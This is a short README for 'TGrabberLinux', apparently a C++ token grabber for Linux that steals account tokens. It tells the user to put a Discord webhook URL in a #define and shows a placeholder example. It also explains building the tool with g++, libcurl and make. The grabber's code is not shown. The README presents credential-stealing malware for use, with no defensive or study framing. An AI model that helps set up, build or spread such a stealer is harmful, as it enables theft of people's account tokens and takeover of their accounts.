# TGrabberLinux
token grabber for linux and unix-like's

### webhooks
you'll need to edit the first line of source code to point to your webhook like from this:
```cpp
#define WEBHOOK "WEBHOOK LINK HERE"
```
to something like this:
```cpp
#define WEBHOOK "https://discord.com/api/webhooks/83473243243243fakelionjdsgofhiudsaf"
```

### compiling
all you need is g++ compiler and libcURL, you can just type `make` in directory, where the source code is and compiler will do the job for you.
